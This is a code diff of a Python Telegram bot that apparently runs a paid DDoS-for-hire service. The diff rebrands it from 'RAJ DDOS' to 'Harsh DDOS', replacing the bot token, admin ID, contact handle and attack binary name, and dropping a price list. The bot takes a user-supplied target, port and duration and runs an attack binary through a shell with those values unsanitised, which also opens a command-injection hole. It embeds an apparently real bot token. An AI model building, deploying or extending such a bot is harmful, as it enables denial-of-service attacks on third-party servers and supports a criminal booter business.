@@ -6,10 +6,10 @@ import datetime
 import os
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7598126124:AAE-VST-rleCjIfUhnU_')
+bot = telebot.TeleBot('8033755504:AAF77C1RnV5CTN31X22801CGBgjwq07p4To')
 
 # Admin user IDs
-admin_id = {"1549748318"}
+admin_id = {"5373866044"}
 
 
 USER_FILE = "users.txt"
@@ -194,7 +194,7 @@ def start_attack_reply(message, king, soulking, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, ✅🔥𝘾𝙊𝙉𝙂𝙍𝘼𝙏𝙐𝙇𝘼𝙏𝙄𝙊𝙉𝙎🔥✅\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {king}\n𝐏𝐨𝐫𝐭: {soulking}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: Raj\n\n🌟 RAJ DDOS OFFICIAL..!💀"
+    response = f"{username}, ✅🔥𝘾𝙊𝙉𝙂𝙍𝘼𝙏𝙐𝙇𝘼𝙏𝙄𝙊𝙉𝙎🔥✅\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {king}\n𝐏𝐨𝐫𝐭: {soulking}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: Raj\n\n🌟 Harsh DDOS OFFICIAL..!💀"
     bot.reply_to(message, response)
 
 soul_cooldown = {}
@@ -225,13 +225,13 @@ def handle_soul(message):
                 record_command_logs(user_id, '/soul_compiled', king, soulking, time)
                 log_command(user_id, king, soulking, time)
                 start_attack_reply(message, king, soulking, time)  
-                full_command = f"./bgmi {king} {soulking} {time} 1200"
+                full_command = f"./Harsh {king} {soulking} {time} 1200"
                 subprocess.run(full_command, shell=True)
                 response = f"-漫~*'¨¯¨'*·舞~ 🇮🇳ąɬɬąƈƙ ƈơɱ℘Ɩɛɬɛɖ🇮🇳 ~舞*'¨¯¨'*·~漫- king: {king} soulking: {soulking} soulking: {time}"
         else:
             response = "✅A͢v͢a͢i͢l͢a͢b͢l͢e͢ r͢i͢g͢h͢t͢ n͢o͢w͢✅ :- /attack <king> <soulking> <time>"  
     else:
-        response = " ミ🥹★ 𝘈𝘤𝘤𝘦𝘴𝘴 𝘭𝘦 𝘭𝘦 𝘣𝘳𝘰 ★🥹彡DM - @RAJOWNER90 ."
+        response = " ミ🥹★ 𝘈𝘤𝘤𝘦𝘴𝘴 𝘭𝘦 𝘭𝘦 𝘣𝘳𝘰 ★🥹彡DM - @HarshOP001 ."
 
     bot.reply_to(message, response)
 
@@ -308,9 +308,7 @@ Vip 🌟 :
 -> Concurrents Attack : 3
 
 Pr-ice List💸 :
-Day-->100 Rs
-Week-->500 Rs
-Month-->1200 Rs
+massage :- @HarshOP001
 '''
     bot.reply_to(message, response)
 
